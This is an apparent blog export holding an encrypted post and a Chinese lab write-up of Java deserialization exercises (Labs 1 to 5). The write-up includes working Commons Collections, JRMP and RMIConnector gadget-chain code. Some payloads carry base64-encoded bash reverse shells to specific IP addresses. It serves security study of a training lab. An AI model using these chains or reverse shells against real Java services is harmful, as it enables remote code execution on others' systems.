cdd67aa93b51ffb2e0382490fb0f9c912f06bc9cbc9ee8b012a54f3458f9c98fee7a66e11dee055d122ccf8e2405fb75a6516281ce843400a8c631a564b4f99cc33132d9a74dc31d5799761592db721d8929454be1b916cfd300188c5a2efb150a20879c86cf453f634a5beb417caff93cb2d0e3efc09811b2cc1d1b060e87d72079de4bce1f15b276c2256edfe0864e132a02b84b946f32ecc4ec5466458a2ac990667c9c570e5babe0e3846f0a2a224673b4f985906ed081acd731baf0b3b559c5d04ea260d354fb386859d4a71442ee9e25fe4b6b71ed8e8dae9546c93c1e097b3ff0551faf05598e05e434a83be76e4dc22541f6625b66179898084bcedb055b9fddc03a2d7c8c2c1daa498ade945438f304e4ff734f5d8557d73ac152dceb1270f0828fb2bb944c5ca1257d39e7653c5b5b79ba27c07e890d52c37f05b7419726a379cacc63ebe3bf0608ac945ff9235c8f62c3311d7c8c9c6f8162578859c652e8a0310eb1dd06dffd4ea7ee4b885064dbb9de246931609924df4e6cf19d328a8a3cfc31a065a126f37a3523c597b6b64c97da57998e2c5a74e180284b116ceded5638aed062ea9d5366cc41d7bdb1439f12e0e2a1b13db27b9390b1bb5307e1d804e54b480aeaf4f5b00ffd2f313d9065750251516f431cab9cc9db1d8fed4d3bf64fda0c7407b25ff26c3cd2174b329ce1e0828ed893ee52e50afed5d8fb2e1d5a2cffe524d941c3ae345eebb936407963f0785e87e49b1bf2465e72d2b58596067f8428a5fbbbd487f6457b62f76579f412caae6d5d2ba88187ff25731745e0f32eec8dfd83e60564d4574fa1d194816d28c9df25f1bab96ab5efb4ac2ca989de0ff72061d313a47205cea5a74bab9a4382328435174ddcfb818d2dced1be7cf972c0847e831387d193bf3a5c12b54a52991a5ee5277ff1bd389e3b32a2de3e63726c80837f2dddc37e3084d5df6a6328819ab40601ebfbbe22215be26d0c3692a5ba8a354a2652c9af570170b5921b529cbeb27f49183a54920ec9911d942d1b2555f41a6676d1d981b8443067e08642a6ca73c636bdd027d6c1133374976fb9fc86c562e9be5e81c2d1334878b3727633eff35043c99596856e1dba49b340fe82d1b3845055a9bed6da0206f59806292fac90283e9b75f296053e412b6102effb59c59564f2bba4d86f10ef29351c373a972e2d50c8b5b1aa6114a74907f9dda82329c58d322af4e6620203016067381ea2fcd9f8cb7d49640bba3285dfa9818b7b2985aaa588a3a7734c8f1e2b648afe36d0ae8098dc7402983c6a5e061d9a4793027e95b84e6c9da034277024a64799979508b2c29ae1e02319e19cf6a1a74de4abd86078050a8a58d288e8941872a3136a35e8fec2f651262958499a2ee6dad956f42191f461ed015b390c30a2cc5857d9ebe647f6f08169ccbb67302a74592ac892037e606fdebc94002acfecda30d02b84586bd67e22ecd2c79fa462a40ceb4da470c20bdeea77fe3b3d38bf37edf551cc7c8264595440932a589a1253ba747b3ff05766f95a0b43f83925be6a9ecb0af3f77cd7d87da64035499849f1f5ca1fdf91372fb637dcdca5f313e0106bd69b6aa9f5f351fcd60cfc3b4af4daa009cb12a510e3eeb8c82f7621d9fc640176ae1456b91af23f412bd4ecfc94909865fd4e60fe569960bc7dca74239d6648e92ac39f49ab35eee3d85c05f54628169a1c1f737b418c06748e6b9c5c0de27443c1ff26fdd5c5aa3509eb0a26b129bae0b0fa2042eebf304cb3ec8cd6cdaee071469a6f9f54c8acd79305468b684652a7b58ef038aef07eea238daf4d7e00a35ebd2611bd7e884db399453adc80fdaf18256d85d993a8b52c51a21035393bf59de2847c67916467cc9be3b4073fda84f22b488e8ca2e2b2deba824253bdcfada30be2627683cb35cc948c161427bc16e47469aa7200f6a82bb0a1da9c26ed9193e34198e7f05ad86d97113c10952e85b4edd5af54107aa94531dba9861afd032c1f39cd51f5958b2b6178d65073e647936690cb8509992ab9245f32ab8614f1b70ea3cf62f08f085b5b9e4593595e2a4a70219fd28c69435ce3728925b7d2db24956defa08cf3d9546b6fe7c2a547fdb1df6733db76ae4265da7bc6580c9d584383905326d342b50606d0727f0b3425b6094e2029ed08f3c9fdebeadac04cf85a577c7c80d7b566001d6c023bc9208f8f7928dcf323b403f10f09c461f098422bd1a9b738b4070ab4d46260eeecd70440017f88e405ef1c5c4008e70cd348383218b8ef4053ae092d236dce034e6bc1b70580971b90ebb615c4f59f617f3f0ed958c2e215e070f1d2df4dfd57e5d8c73961c44e7bb31210f8958430d6e312866a8a4634c2f4cab95e13bc0969facbcc2e1ac1a9ddc13f1fa0a63f1251cc9d628b548f4d5538274f0f727250ec1ed85742488733359b1a2397cb4c26e188c045300a88541362a62cb399624f7bd92a4b0f6f294d80af696c4a138386c22d3faebf4c6212bdfe2b966775161a058b061e47032eb8fbfaa78334ccf2778b126f13d758e786b8b796552a6b275a0e4f696276ec30b289c6b877fa29ce9c8d551f28329e211af051c5344cb80d7434cd649f9c31c42329c33ebb50569c328c727708708bade565dfd74856c458c0d28767de51b39cb4a74f314b1a01f9b53f8e8a8c50b1572e33bcf64058f6cccaa6620acce2b3ce384bd53e4673d08c19f017ce0cabcd3878101380820f044d8ee0f8782dbd56fe32a204443eb36a21d3a34c1f6feb024a061a9aa44f289a8265d671430900171ab621cbecdb26e5d3b3ec1cefa25c3e40fa11924bbd7814194f8bb119b7221615e6115ae8f457c8a0ce9826f4a3e5246bda6350bb6931cc06477e0ff5f77f08dcc8da230d6db9d7703a2537fa64783c974e1d33d50ea94e6ef0ed09920017415e940dd0674aacf692d27a8cf73ceeba5c6974060746dca056020c070e9a6966c2494d9799e22e525e152c62b47c31daf4bb134f49a1b9de7e60a49aba113622bf828f2c927df2d99f74aa008be861710a1dfab5be757842f54d2feb41c9f2fc69acce744c3ab1604be183ccbca982c165eba062b056dc9e5b2906055a34ee971d0c05cdf646af71384c1e650603c4174ecc7f47dd14e04be9ec9d8bf5a5c29499f8c94603c3f3d9ce79e29ecc27b0a81387301d3ebf65ebecb17d1208895f725d743c7fc83c4c577f4bf39aa1b13fe217ea317b8f36db09055cde45d94ba9925e0a7e45574d1c79925f05393a6f1e575f06e03f6e1280e5cb038ab00ce8ecd4fc52b09a9bacda0c364d59811a6ef2dd697852995153a64e145c5efd286775b84e73671ce89431f254de96f4919c3cf4435520850d0c5060ebed0945b83024dc5fed665c2edd9600648ef84740ae58f3a0ca5b10b5cb877868dc7ca9e2683e83b60bc9985611a1fb40c51010fbbfb7aadb389a7bed2054f62decd3ed1f2488f593e5c5a04a79f5c4863209ca4661e1967df862a6d2feadb3d683e6f1f89fdee5c902895008305e823f4be062638322f2a1bc87fffb322050f3512154e7d47011b17bc9cb1754a84966715d8dd88a8a499e0aa58a22077aaa7e594c99257b3772aee6564c7e4dcff5503365938f22fe2a8c953f3881bc17066bdb049d66ee74730f528fd5652120f0cbc96c629898c21cf111d106889dafef3504ad8773ebfa1e8f1d693cbaaf602a1d1174f83e1f4532772ebcb100fbc7f08cdea01c1a73d22f80c849d5d8724c9fb15f1e17af0db91c23eea7c5c0228239a10e80861fbb249d6d15cd6c4c708e647a1dba3b67d4987db711c9454dc9dcf5f5a766f83e4e6c7103fafe45da4aea1bd5e254f4fa97084b0c8051f004720646dc9bc9c8717947237d7571ea769c31f718dbba1975f880f8ff8bb6c4d3ae9e297107e63e3775aeeb6de1ec8d1170cf81e9fe4a37a2d0ae3dc3367b4ae47985d6d591b9dfaea2a2aa4fc2cf1c1acd1fd2dc25184f1c3467ea3e4cd5595d8a9d6ebc3d827e88398709c8ebdc48363bac200e41f4a2ad44e38ee6274847c2be7b61261bbe5537f9ebec4443464e96f2c4bbac66881a9d77500391be7dad2a815edc0e9bf6fb2ed42649409227b707ee0a67bf9ab6a0103cdb7adff2a142f6d65b9797a69ca682c4cd086cfcead7d05071be39f06800b06c338579c91ca3a77164b5c56d5e091faef1d5fef5905a79d0afc1aa2f0ebc531f09da01e8502607c072e62a9c804eef461222bf591ea26690584711673737beb4d21d760c8380541f92e3990dccc476b60a4cb7ab04de79edaa5abdcd84597f120f8052a9520fc72a06e2fffdf7d66857828dee014152dd35452803fddfc0d56fb35e2a3668ff2a316ac4a92fb8452cebb5cca6ce47f1bd3b9d37fccc35a5a4866c1a99f4b719a824d3d0f61335dbb6e47f2253a4207b0afc3654c643e0d10304eb78bcd3d922e6be2a00c11d20b9eda2f9fc43582ff32e67680edf5e1fa792c7b70b7b21a3878e55eb0b8ce2cdfa2aa64246c3e47734f580e9ccc40c6b8e81a195b4c5444e41f79b4edf4e0d71994ec4175953dfff1aca9dea3c2117a2b1bab172d1b86f5aa33ad2
  
    
      
      
        请输入密码
      
    
  

]]></content>
  </entry>
  <entry>
    <title>JavaDeserializeLabs</title>
    <url>/2024/11/15/JavaDeserializeLabs/</url>
    <content><![CDATA[Lab1在java中对于bash命令的执行会把它按照空格分成三部分，也就是反弹shell命令中只能存在两个空格
序列化脚本如下：
package yxxx.javasec.deserialize;import com.yxxx.javasec.deserialize.Calc;import com.yxxx.javasec.deserialize.Utils;import java.io.ByteArrayOutputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;public class Test &#123;    public static void main(String[] args) throws Exception &#123;        Calc calc = new Calc();        Class c = calc.getClass();        Field field = c.getDeclaredField(&quot;canPopCalc&quot;);        field.setAccessible(true);        field.set(calc,true);        Field field1 = c.getDeclaredField(&quot;cmd&quot;);        field1.setAccessible(true);        field1.set(calc,&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMTMuMTAyLjQ2Lzc3NzcgMD4mMQ0K&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;);        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);        objectOutputStream.writeObject(calc);        System.out.println(Utils.bytesTohexString(byteArrayOutputStream.toByteArray()));    &#125;&#125;

Lab2该题题目没有提供任何的类供我们来解决问题，但是我们看提供的库里面有CommonsCollections依赖，这样的话我们就可以利用cc链实现反序列化，达到rce的目的

由于像cc1等链会受到jdk版本的限制，所以我们这边使用不会受版本限制的一条链，也就是cc6，所以我们的payload如下：
package org.example.lab2.demos.web;import com.yxxx.javasec.deserialize.Utils;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import java.io.*;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Proxy;import java.util.HashMap;import java.util.Map;public class Sherlock &#123;    public static void main(String[] args) throws Exception &#123;        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMTMuMTAyLjQ2Lzc3NzcgMD4mMQ0K&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;&#125;)        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;aaa&quot;);        HashMap&lt;Object, Object&gt; map2 = new HashMap&lt;&gt;();        map2.put(tiedMapEntry, &quot;bbb&quot;);        lazyMap.remove(&quot;aaa&quot;);        Class c = LazyMap.class;        Field factoryField = c.getDeclaredField(&quot;factory&quot;);        factoryField.setAccessible(true);        factoryField.set(lazyMap, chainedTransformer);        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);        objectOutputStream.writeUTF(&quot;SJTU&quot;);        objectOutputStream.writeInt(1896);        objectOutputStream.writeObject(map2);        System.out.println(Utils.bytesTohexString(byteArrayOutputStream.toByteArray()));//        ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));//        String name = objectInputStream.readUTF();//        int year = objectInputStream.readInt();//        if (name.equals(&quot;SJTU&quot;) &amp;&amp; year == 1896) &#123;//            objectInputStream.readObject();//        &#125;&#125;

Lab3首先观察到题目提供的库里面还是有CommonsCollections依赖，所以我们把第二题的payload先直接cv一遍，但是要注意的是在进行本地测试的时候反序列化的代码要更改为与题目符合的
这是因为在文件IndexController.class中调用的是自己写的MyObjectInputStream类
类的内容如下，重写了一个resolveClass()方法以及构造函数，构造函数中获取类Transformer类的类加载器，向上转型为URLClassLoader，获取URL数组对象，赋值给classLoader
重写的resolveClass()方法中，调用的是这个新的classLoader来进行类加载
public class MyObjectInputStream extends ObjectInputStream &#123;    private ClassLoader classLoader;    public MyObjectInputStream(InputStream inputStream) throws Exception &#123;        super(inputStream);        URL[] urls = ((URLClassLoader)Transformer.class.getClassLoader()).getURLs();        this.classLoader = new URLClassLoader(urls);    &#125;    protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException &#123;        Class clazz = this.classLoader.loadClass(desc.getName());        return clazz;    &#125;&#125;

更改完测试的时候会直接报错如下：

这里的[L开头指的是一个数组，即Transformer数组类去进行类加载失效
点击下面一行的报错，跳转至URLClassLoader.class文件中可以发现抛出该异常的原因是result&#x3D;&#x3D;null
往上看result值的获取为下面这段代码：
result = AccessController.doPrivileged(                new PrivilegedExceptionAction&lt;Class&lt;?&gt;&gt;() &#123;                    public Class&lt;?&gt; run() throws ClassNotFoundException &#123;                        String path = name.replace(&#x27;.&#x27;, &#x27;/&#x27;).concat(&quot;.class&quot;);                        Resource res = ucp.getResource(path, false);                        if (res != null) &#123;                            try &#123;                                return defineClass(name, res);                            &#125; catch (IOException e) &#123;                                throw new ClassNotFoundException(name, e);                            &#125;                        &#125; else &#123;                            return null;                        &#125;                    &#125;                &#125;, acc);

参数path是将name中的所有.都替换为反斜杠，然后最后接上.class
然后得到的path用于getResource()获取资源，成功的话就调用defineClass()进行类加载从而得到result
我们在这边打上断点看一下，这一步我是一直点绿色的恢复程序才调试到的
发现name的值是奇奇怪怪的一个数组类

继续调试发现抛出异常的原因就是因为是数组类

尝试过后发现只要是数组那么都会抛出异常

我们查看一下ObjectInputStream类中的原生resolveClass()
protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc)    throws IOException, ClassNotFoundException&#123;    String name = desc.getName();    try &#123;        return Class.forName(name, false, latestUserDefinedLoader());    &#125; catch (ClassNotFoundException ex) &#123;        Class&lt;?&gt; cl = primClasses.get(name);        if (cl != null) &#123;            return cl;        &#125; else &#123;            throw ex;        &#125;    &#125;&#125;

可以发现调用的类加载方法是forName，而在自定义的MyObjectInputStream.class中调用的类加载方法是loadClass
怀疑loadClass方法不支持加载数组类，所以自己重写了个MyObjectInputStream1，通过判断是不是数组对象的类加载
如果是的话，应以[L开头，这时候我们调用forName()即可，成功触发命令
public class MyObjectInputStream1 extends ObjectInputStream &#123;    private ClassLoader classLoader;    public MyObjectInputStream1(InputStream in) throws Exception &#123;        super(in);        URL[] urls = ((URLClassLoader) ClassLoader.getSystemClassLoader()).getURLs();        this.classLoader = ClassLoader.getSystemClassLoader();    &#125;    protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException &#123;        if (desc.getName().startsWith(&quot;[L&quot;))&#123;            return Class.forName(desc.getName());        &#125;        return this.classLoader.loadClass(desc.getName());//        return Class.forName(desc.getName());    &#125;&#125;

成功证明loadClass方法不支持数组类加载，gpt骗我
所以我们的payload中不能够有数组，想起了刚刚学完的shiro反序列化中没有用到数组类，但很可惜没有CB依赖
到yso中去看看有没有用不到数组类，又是jdk自身的链子的
正好就在payloads&#x2F;JRMPLinstener文件中，其gadget如下
Gadget chain: UnicastRemoteObject.readObject(ObjectInputStream) line: 235  UnicastRemoteObject.reexport() line: 266   UnicastRemoteObject.exportObject(Remote, int) line: 320    UnicastRemoteObject.exportObject(Remote, UnicastServerRef) line: 383	 UnicastServerRef.exportObject(Remote, Object, boolean) line: 208	  LiveRef.exportObject(Target) line: 147	   TCPEndpoint.exportObject(Target) line: 411		TCPTransport.exportObject(Target) line: 249		 TCPTransport.listen() line: 319

再看看题目jdk版本为8u222，正好可以直接利用该链
开启JRMP Listener
java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 &quot;bash -c &#123;echo, YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMjguMTA5LzkzMjAgMD4mMQ==&#125;|&#123;base64, -d&#125;|&#123;bash, -i&#125;&quot;

payload
package org.example;import com.yxxx.javasec.deserialize.MyObjectInputStream;import com.yxxx.javasec.deserialize.Utils;import sun.rmi.server.UnicastRef;import sun.rmi.transport.LiveRef;import sun.rmi.transport.tcp.TCPEndpoint;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Proxy;import java.rmi.AlreadyBoundException;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;import java.rmi.server.ObjID;import java.rmi.server.RemoteObjectInvocationHandler;import java.util.Random;public class Main &#123;    public static void main(String[] args) throws Exception &#123;        Registry reg = LocateRegistry.getRegistry(&quot;192.168.0.103&quot;,1099);        ObjID id = new ObjID(new Random().nextInt()); // RMI registry        TCPEndpoint te = new TCPEndpoint(&quot;192.168.0.103&quot;, 1099);        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);        Registry proxy = (Registry) Proxy.newProxyInstance(Main.class.getClassLoader(), new Class[] &#123;                Registry.class        &#125;, obj);        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);        objectOutputStream.writeUTF(&quot;SJTU&quot;);        objectOutputStream.writeInt(1896);        objectOutputStream.writeObject(proxy);        System.out.println(Utils.bytesTohexString(byteArrayOutputStream.toByteArray()));        ByteArrayInputStream inputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());        ObjectInputStream objectInputStream = new MyObjectInputStream(inputStream);        objectInputStream.readUTF();        objectInputStream.readInt();        objectInputStream.readObject();        System.out.println(Utils.bytesTohexString(byteArrayOutputStream.toByteArray()));    &#125;&#125;

Lab4先查看一手依赖库，发现有jackson的相关库，并且版本高于2.10，直接上通杀poc
结果很遗憾，题目没有javassist库，该另寻他路了

java层面的代码和lab3是一模一样的，但是多了一层nginx配置阻止出网
在RMIConnector下的fimdRMIServerJRMP()方法下，有一处反序列化

从函数内容可知是将传入的参数base64进行base64解码之后再将其进行反序列化
查找该函数的用法，还是位于同文件下的findRMIServer方法中，只要传入的路径满足/stub/开头就行

查找findRMIServer的用法，位于同文件下的connect方法中

要怎么调用到connect方法呢，根据前面学习到的cc链可知能通过invokerTransformer类来触发，但是该题是不允许数组类的存在，所以不能用chainTransformer类，那么我们可以利用CC6中的TiedMapEntry的方式来触发invokerTransformer，并以HashMap当作入口类
connect方法中的jmxServiceURL参数是在该类的构造函数中获取的

根据该构造函数简单写个函数
public static Object getBind() throws Exception &#123;    JMXServiceURL jmxServiceURL = new JMXServiceURL(&quot;http://www.baidu.com&quot;);    RMIConnector connector = new RMIConnector(jmxServiceURL, new HashMap&lt;&gt;());    connector.connect();    System.out.println(jmxServiceURL.getURLPath());    return null;

报错

查了一下发现url前面必须加上service:jmx:，修改一手
继续报错如下

调试一手，发现协议需要改一下，不能够是http协议

继续修改：
public static Object getBind() throws Exception &#123;    JMXServiceURL jmxServiceURL = new JMXServiceURL(&quot;service:jmx:rmi://www.baidu.com&quot;);    RMIConnector connector = new RMIConnector(jmxServiceURL, new HashMap&lt;&gt;());    connector.connect();    System.out.println(jmxServiceURL.getURLPath());    return null;&#125;

继续报错

这报错很明显，直接修改：
public static Object getBind() throws Exception &#123;    JMXServiceURL jmxServiceURL = new JMXServiceURL(&quot;service:jmx:rmi://www.baidu.com/stub/12138&quot;);    RMIConnector connector = new RMIConnector(jmxServiceURL, new HashMap&lt;&gt;());    connector.connect();    System.out.println(jmxServiceURL.getURLPath());    return null;&#125;


虽然报错但我们已经走到了base64解码的地方，也就是说我们只要在/stub/后面加上我们base64解码后的payload就可以了
所以接下来我们就加上TiedMapEntry：
public static Object getBind() throws Exception &#123;    JMXServiceURL jmxServiceURL = new JMXServiceURL(&quot;service:jmx:rmi://www.baidu.com/stub/12138&quot;);    RMIConnector connector = new RMIConnector(jmxServiceURL, new HashMap&lt;&gt;());    connector.connect();    System.out.println(jmxServiceURL.getURLPath());    InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;connect&quot;,null,null);    HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();    Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));    TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;connector&quot;);    HashMap&lt;Object, Object&gt; map2 = new HashMap&lt;&gt;();    map2.put(tiedMapEntry, &quot;bbb&quot;);    lazyMap.remove(&quot;connector&quot;);    Class c = LazyMap.class;    Field factoryField = c.getDeclaredField(&quot;factory&quot;);    factoryField.setAccessible(true);    factoryField.set(lazyMap, invokerTransformer);    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();    ObjectOutputStream outputStream = new ObjectOutputStream(byteArrayOutputStream);    outputStream.writeObject(map2);    ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());    ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);    objectInputStream.readObject();    return null;&#125;

跟上面同样的base64报错，我们已经知道原因，所以我们加上我们的base64的payload后就可以进行二次反序列化了
先利用yso工具生成一个payload
java -jar ysoserial-all.jar CommonsCollections5 &quot;calc&quot; &gt; sherlock.txt

然后我们再次修改getBind()函数
public static Object getBind() throws Exception &#123;    byte[] fileContent = Files.readAllBytes(Paths.get(&quot;E:\\safety\\ysoserial-master\\sherlock.txt&quot;));    String payload = Base64.getEncoder().encodeToString(fileContent);    JMXServiceURL jmxServiceURL = new JMXServiceURL(&quot;service:jmx:rmi://www.baidu.com/stub/&quot;+payload);    RMIConnector connector = new RMIConnector(jmxServiceURL, new HashMap&lt;&gt;());    //connector.connect();    InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;connect&quot;,null,null);    HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();    LazyMap lazyMap = (LazyMap) LazyMap.decorate(map, new ConstantTransformer(1));    TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, connector);    HashMap&lt;Object, Object&gt; map2 = new HashMap&lt;&gt;();    map2.put(tiedMapEntry, &quot;bbb&quot;);    Class&lt;?&gt; c = LazyMap.class;    Field factoryField = c.getDeclaredField(&quot;factory&quot;);    factoryField.setAccessible(true);    factoryField.set(lazyMap, invokerTransformer);    lazyMap.remove(connector);    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();    ObjectOutputStream outputStream = new ObjectOutputStream(byteArrayOutputStream);    outputStream.writeObject(map2);    ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());    ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);    objectInputStream.readObject();    return null;&#125;

成功弹出计算器
重新生成paylaod
java -jar ysoserial-all.jar CommonsCollections5 &quot;touch /tmp/666&quot; &gt; sherlock.txt

poc:
package org.example;import com.yxxx.javasec.deserialize.Utils;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import javax.management.remote.JMXServiceURL;import javax.management.remote.rmi.RMIConnector;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.Base64;import java.util.HashMap;public class Test &#123;    public static void main(String[] args) throws Exception &#123;        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();        ObjectOutputStream outputStream = new ObjectOutputStream(byteArrayOutputStream);        outputStream.writeUTF(&quot;SJTU&quot;);        outputStream.writeInt(1896);        outputStream.writeObject(getBind());        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);        objectInputStream.readUTF();        objectInputStream.readInt();        objectInputStream.readObject();        System.out.println(Utils.bytesTohexString(byteArrayOutputStream.toByteArray()));    &#125;    public static Object getBind() throws Exception &#123;        byte[] fileContent = Files.readAllBytes(Paths.get(&quot;E:\\safety\\ysoserial-master\\sherlock.txt&quot;));        String payload = Base64.getEncoder().encodeToString(fileContent);        JMXServiceURL jmxServiceURL = new JMXServiceURL(&quot;service:jmx:rmi://www.baidu.com/stub/&quot;+payload);        RMIConnector connector = new RMIConnector(jmxServiceURL, new HashMap&lt;&gt;());        //connector.connect();        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;connect&quot;,null,null);        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();        LazyMap lazyMap = (LazyMap) LazyMap.decorate(map, new ConstantTransformer(1));        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, connector);        HashMap&lt;Object, Object&gt; map2 = new HashMap&lt;&gt;();        map2.put(tiedMapEntry, &quot;bbb&quot;);        Class&lt;?&gt; c = LazyMap.class;        Field factoryField = c.getDeclaredField(&quot;factory&quot;);        factoryField.setAccessible(true);        factoryField.set(lazyMap, invokerTransformer);        lazyMap.remove(connector);        return map2;    &#125;&#125;

虽然页面会报错但查看相关目录下面还是成功写进了文件666


Lab5一开始我们一样看代码，看看和lab4相比有什么变化
首先就是MyObjectInputStream类中的改变，增加了黑名单，并且在静态代码块中添加，所以会被最先运行
然后后面做了一个do-while循环检查反序列化的类名是否在黑名单中，在的话就会抛出异常”go out!”
黑名单定义如下：
像是前面那些Transformer，都在functors下，所以之前的poc就不能用了
不仅如此，下面还又定义了一个方法resolveProxyClass，主要作用是根据接口名称数组加载对应的接口类，并创建或返回一个动态代理类
查找一下它的用法，发现会在ObjectInputStream下面被调用

这道题需要跟进一下原生反序列化的过程，即readObject()的部分反序列化流程
先创建一个普通的类
package org.example;import java.io.ObjectInputStream;import java.io.Serializable;public class UserTest implements Serializable &#123;    public UserTest()&#123;&#125;    public int age;    public String name;    private float weight;    public UserTest(int age,String name,float weight)&#123;        this.name = name;        this.age = age;        this.weight = weight;    &#125;    static &#123;        System.out.println(&quot;static&quot;);    &#125;&#125;

然后创建对象，用原生序列化，用原生反序列化
package org.example;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;public class Main &#123;    public static void main(String[] args) throws Exception&#123;        UserTest userTest = new UserTest(21,&quot;sherlock&quot;,65);        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();        ObjectOutputStream outputStream = new ObjectOutputStream(byteArrayOutputStream);        outputStream.writeUTF(&quot;SJTU&quot;);        outputStream.writeInt(1896);        outputStream.writeObject(userTest);        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);        objectInputStream.readUTF();        objectInputStream.readInt();        objectInputStream.readObject();    &#125;&#125;

断点打在readObject()处，强制跟进去

继续跟进readOject0()中

gpt给出的解释是：
这段代码是Java反序列化过程中readObject0方法的一部分，它处理输入流中的不同类型的对象数据。下面是对代码的逐步分析：

跳过重置标记:
byte tc;while ((tc = bin.peekByte()) == TC_RESET) &#123;    bin.readByte();    handleReset();&#125;

这部分代码通过循环跳过所有的 TC_RESET 标记，并调用 handleReset() 方法来处理重置操作。循环结束后，tc 变量保存了第一个非 TC_RESET 的字节

增加深度计数:
depth++;

depth 是一个计数器，用于跟踪当前反序列化调用的深度。这在处理嵌套对象时很有用

根据类型处理不同的数据:
switch (tc) &#123;    // 各种类型的处理逻辑&#125;

通过 switch 语句，代码根据 tc 的值来确定接下来要处理的对象类型。不同的类型代码有不同的处理逻辑：

TC_NULL: 调用 readNull() 方法处理空引用。
TC_REFERENCE: 调用 readHandle(unshared) 方法处理对象引用。
TC_CLASS: 调用 readClass(unshared) 方法处理类对象。
TC_CLASSDESC 和 TC_PROXYCLASSDESC: 调用 readClassDesc(unshared) 方法处理类描述符。
TC_STRING 和 TC_LONGSTRING: 调用 readString(unshared) 并通过 checkResolve 方法处理字符串。
TC_ARRAY: 调用 readArray(unshared) 并通过 checkResolve 方法处理数组。
TC_ENUM: 调用 readEnum(unshared) 并通过 checkResolve 方法处理枚举。
TC_OBJECT: 调用 readOrdinaryObject(unshared) 并通过 checkResolve 方法处理普通对象。
TC_EXCEPTION: 调用 readFatalException() 读取异常，并抛出 WriteAbortedException。
TC_BLOCKDATA 和 TC_BLOCKDATALONG: 处理块数据模式，如果 oldMode 为 true，则设置块数据模式并抛出 OptionalDataException；否则抛出 StreamCorruptedException。
TC_ENDBLOCKDATA: 如果 oldMode 为 true，抛出 OptionalDataException；否则抛出 StreamCorruptedException。


默认情况:
